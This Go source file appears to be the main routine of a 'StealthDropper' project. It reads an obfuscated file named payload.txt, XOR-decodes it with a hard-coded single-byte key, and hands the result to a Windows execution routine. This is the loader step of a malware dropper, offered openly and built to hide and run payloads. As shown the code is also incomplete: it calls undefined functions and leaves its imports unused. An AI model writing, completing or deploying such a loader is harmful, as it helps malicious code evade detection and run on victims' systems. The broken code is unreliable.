package main

import "fmt"
import "os"
import "github.com/Cyber-30/StealthDropper/encoder"
import "github.com/Cyber-30/StealthDropper/exec/exec/exec_win"

func decode(data []byte) []byte {
	key := byte(0xAA)
	return XOR(data, key)
}

func main() {
	payload, err := os.ReadFile("payload.txt")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}
	decoded := decode(payload)
	executepayload(decoded)
}
